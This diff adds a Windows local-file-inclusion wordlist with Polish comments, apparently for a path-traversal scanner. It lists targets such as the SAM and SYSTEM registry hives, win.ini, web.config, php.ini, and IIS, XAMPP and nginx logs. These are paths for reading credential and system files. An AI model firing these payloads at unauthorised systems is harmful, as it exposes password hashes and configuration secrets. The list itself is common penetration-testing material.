@@ -1,0 +1,24 @@
+# Cele LFI dla Windows. Bez prefiksów ../ — te dokłada moduł traversal.
+# Jedna ścieżka na linię, # = komentarz.
+
+C:/Windows/win.ini
+C:/Windows/system.ini
+C:/boot.ini
+C:/Windows/System32/drivers/etc/hosts
+C:/Windows/repair/sam
+C:/Windows/repair/system
+C:/Windows/System32/config/SAM
+C:/Windows/System32/config/SYSTEM
+C:/Windows/debug/NetSetup.log
+C:/Windows/php.ini
+C:/inetpub/wwwroot/web.config
+C:/inetpub/logs/LogFiles/W3SVC1/access.log
+
+# --- konfiguracja typowych stosów webowych na Windows (XAMPP/nginx) ---
+C:/xampp/apache/logs/access.log
+C:/xampp/apache/logs/error.log
+C:/xampp/php/php.ini
+C:/nginx/log/access.log
+C:/nginx/log/error.log
+../web.config
+../../web.config
